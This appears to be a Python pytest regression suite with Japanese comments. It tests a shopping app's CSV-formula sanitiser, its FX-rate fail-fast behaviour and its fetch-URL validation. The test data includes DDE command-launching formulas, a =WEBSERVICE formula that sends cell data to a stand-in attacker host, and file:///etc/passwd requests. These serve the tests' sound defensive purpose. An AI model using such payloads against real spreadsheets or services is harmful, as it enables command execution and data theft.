"""Strix診断（2026-11-17）Immediate対応4項目の回帰テスト。

対象:
- CSV式インジェクションの無害化（sanitize_csv_cell）
- FXレート欠損時の1.0黙示停止
- 取得先URL検証の一元化
- Pillowの形式許可リスト
"""

from __future__ import annotations

import csv
import inspect
import io
from pathlib import Path

import pytest

from app.utils.validation import (
    ValidationError,
    sanitize_csv_cell,
    validate_fetch_url,
)

# ----------------------------------------------------------------------
# ① CSV式インジェクション
# ----------------------------------------------------------------------
FORMULA_PAYLOADS = [
    "=cmd|'/C calc'!A0",
    "@SUM(1+9)*cmd|' /C calc'!A0",
    "-2+3+cmd|' /C calc'!A0",
    "+1|cmd|'/C calc'!A0",
    '=HYPERLINK("http://evil.invalid/x","click")',
    '=WEBSERVICE("http://evil.invalid/"&A1)',
]


class TestSanitizeCsvCell:
    """sanitize_csv_cell:  spreadsheetが式として解釈する接頭辞を無効化する。"""

    @pytest.mark.parametrize("payload", FORMULA_PAYLOADS)
    def test_formula_payloads_are_neutralized(self, payload: str) -> None:
        result = sanitize_csv_cell(payload)
        assert not result.startswith(("=", "@", "+"))
        assert not result.startswith("-")
        assert result.startswith("'")

    def test_leading_whitespace_formula_is_neutralized(self) -> None:
        assert sanitize_csv_cell("  =HYPERLINK(\"http://x\",\"y\")").startswith("'")

    def test_tab_and_cr_prefixed_are_neutralized(self) -> None:
        assert sanitize_csv_cell("\t=1+1").startswith("'")
        assert sanitize_csv_cell("\r=1+1").startswith("'")

    @pytest.mark.parametrize(
        "value",
        ["-17.6%", "-3439", "-1,234.5", "109-2837", "0", "12345"],
    )
    def test_numeric_values_are_preserved(self, value: str) -> None:
        """正当な数値（負数・小数・パーセント・範囲）は書き換えない。"""
        assert sanitize_csv_cell(value) == value

    @pytest.mark.parametrize("value", [" normale", "商品A", "", "Gucci"])
    def test_plain_text_is_preserved(self, value: str) -> None:
        assert sanitize_csv_cell(value) == value

    def test_non_string_passes_through(self) -> None:
        assert sanitize_csv_cell(123) == 123
        assert sanitize_csv_cell(1.5) == 1.5
        assert sanitize_csv_cell(None) is None

    def test_result_is_text_for_spreadsheet(self) -> None:
        """戻り値は文字列型（表計算ではテキストとして扱われる）。"""
        result = sanitize_csv_cell("=1+1")
        assert isinstance(result, str)


class TestCsvExportsAreSafe:
    """エクスポート5経路で式ペイロードがセル先頭に残らないこと。"""

    def _rows(self, csv_text: str) -> list[list[str]]:
        return list(csv.reader(io.StringIO(csv_text)))

    def test_products_export_has_no_formula_cells(self) -> None:
        from app.services.product_csv_service import export_products_csv

        class _P:
            id = 1
            name = "=cmd|'/C calc'!A0"
            brand = "Gucci"
            purchase_price = 100.0
            selling_price = 200.0
            transaction_fee = 0.0
            shipping_cost = 0.0
            customs_duty = 0.0
            procurement_fee = 0.0
            supplier_url = "https://example.invalid/p"
            image_url = ""
            stock_status = True
            brand_tier = ""
            source_type = ""
            source_region = ""
            color = ""
            size = ""
            material = ""
            description = "=WEBSERVICE(\"http://evil.invalid/\"&A1)"
            retail_price = 0
            target_profit_rate = 0.0
            listing_status = "draft"
            created_at = None
            updated_at = None
            warehouse_shipping_cost = 0
            original_currency = "JPY"
            exchange_rate = 1.0
            item_category = ""

        rows = self._rows(export_products_csv([_P()]))  # type: ignore[list-item]
        for row in rows[1:]:
            for cell in row:
                assert not cell.startswith(("=", "@", "+")), cell

    def test_candidates_export_has_no_formula_cells(self) -> None:
        from app.services.product_csv_service import export_candidates_csv

        class _P:
            id = 1
            name = "=HYPERLINK(\"http://x\",\"y\")"
            brand = "Gucci"
            brand_tier = ""
            purchase_price = 100.0
            selling_price = 200.0
            stock_status = True
            listing_status = "draft"
            target_profit_rate = 0.0
            source_type = ""
            item_category = ""

            def calculate_profit(self) -> float:
                return 100.0

            def profit_rate(self) -> float:
                return 0.5

        rows = self._rows(export_candidates_csv([_P()]))  # type: ignore[list-item]
        for row in rows[1:]:
            for cell in row:
                assert not cell.startswith(("=", "@", "+")), cell

    def test_buyma_csv_has_no_formula_cells(self) -> None:
        from app.services.template_service import generate_buyma_csv

        class _P:
            name = "=cmd|'/C calc'!A0"
            brand = "Gucci"
            color = ""
            size = ""
            material = ""
            retail_price = 0
            selling_price = 100
            source_region = ""
            description = "=WEBSERVICE(\"http://evil.invalid/\")"
            item_category = ""
            image_url = ""
            processed_images = None
            pipeline_status = ""

        text, skipped = generate_buyma_csv([_P()])  # type: ignore[list-item]
        rows = self._rows(text)
        for row in rows[1:]:
            for cell in row:
                assert not cell.startswith(("=", "@", "+")), cell


# ----------------------------------------------------------------------
# ② FXレート欠損時の1.0黙示
# ----------------------------------------------------------------------
class TestFxFailFast:
    """為替レート欠損時に1.0で保存しないこと。"""

    def test_make_item_returns_none_when_rate_missing(self, monkeypatch) -> None:
        from app.services import brand_price_scraper

        monkeypatch.setattr(
            "app.utils.fx_utils.get_fx_table_jpy", lambda: ({}, "no-cache"), raising=True
        )
        item = brand_price_scraper._make_item(
            "Gucci", "Test Bag", 890.0, "gucci_official", "https://example.invalid/x", currency="EUR"
        )
        assert item is None, "FXレート欠損時は1.0で保存せず項目を除外すること"

    def test_make_item_uses_rate_when_available(self, monkeypatch) -> None:
        from app.services import brand_price_scraper

        monkeypatch.setattr(
            "app.utils.fx_utils.get_fx_table_jpy", lambda: ({"EUR": 180.0}, None), raising=True
        )
        item = brand_price_scraper._make_item(
            "Gucci", "Test Bag", 890.0, "gucci_official", "https://example.invalid/x", currency="EUR"
        )
        assert item is not None
        assert item["exchange_rate"] == 180.0
        assert item["price_jpy"] == round(890.0 * 180.0)

    def test_make_item_rejects_non_finite_rate(self, monkeypatch) -> None:
        from app.services import brand_price_scraper

        monkeypatch.setattr(
            "app.utils.fx_utils.get_fx_table_jpy",
            lambda: ({"EUR": float("nan")}, None),
            raising=True,
        )
        item = brand_price_scraper._make_item(
            "Gucci", "Test Bag", 890.0, "gucci_official", "https://example.invalid/x", currency="EUR"
        )
        assert item is None, "NaN レートは1.0扱いせず項目を除外すること"

    def test_price_monitor_does_not_use_identity_rate(self) -> None:
        """price monitor が為替テーブル欠損時に1.0へフォールバックしないこと。"""
        from app.services import price_monitor_service

        src = Path(price_monitor_service.__file__).read_text(encoding="utf-8")
        assert "fx_table.get(currency, 1.0)" not in src, "為替テーブル欠損時の1.0フォールバックが残存"
        assert "fx_table.get(currency) or 1.0" not in src, "為替テーブル欠損時の1.0フォールバックが残存"

    def test_product_model_does_not_coerce_zero_rate_to_one(self) -> None:
        """exchange_rate=0 が1.0へ書き換えられないこと（ISSUE-111ガードの迂回防止）。"""
        from app.models.product import Product

        src = Path(inspect.getsourcefile(Product)).read_text(encoding="utf-8")
        assert "nz(self.exchange_rate) or 1.0" not in src, "0レートが1.0へ化ける（旧 ISSUE-111ガード迂回）"


# ----------------------------------------------------------------------
# ③ 取得先URL検証の一元化
# ----------------------------------------------------------------------
class TestValidateFetchUrl:
    """取得先URLの検証（scheme許可リスト+ファイルスキーム拒否）。"""

    @pytest.mark.parametrize(
        "url",
        [
            "file:///etc/passwd",
            "ftp://example.invalid/x",
            "gopher://example.invalid/x",
            "data:text/html,<script>",
        ],
    )
    def test_non_http_schemes_are_rejected(self, url: str) -> None:
        with pytest.raises(ValidationError):
            validate_fetch_url(url)

    @pytest.mark.parametrize(
        "url",
        [
            "https://www.ssense.com/jp/products/1",
            "http://example.invalid/path",
        ],
    )
    def test_http_urls_are_allowed(self, url: str) -> None:
        assert validate_fetch_url(url) == url

    def test_empty_url_is_rejected(self) -> None:
        with pytest.raises(ValidationError):
            validate_fetch_url("")

    def test_cffi_fetch_rejects_file_scheme(self, monkeypatch) -> None:
        """_fetch_with_cffi が file:// を弾くこと。"""
        from app.services import brand_price_scraper

        called = {"hit": False}

        class _FakeResp:
            status_code = 200
            text = "x" * 2000

        def _fake_get(*args, **kwargs):
            called["hit"] = True
            return _FakeResp()

        monkeypatch.setattr("curl_cffi.requests.get", _fake_get)
        result = brand_price_scraper._fetch_with_cffi("file:///etc/passwd")
        assert result is None
        assert called["hit"] is False, "file:// が検証を通過してネットワーク層へ到達した"
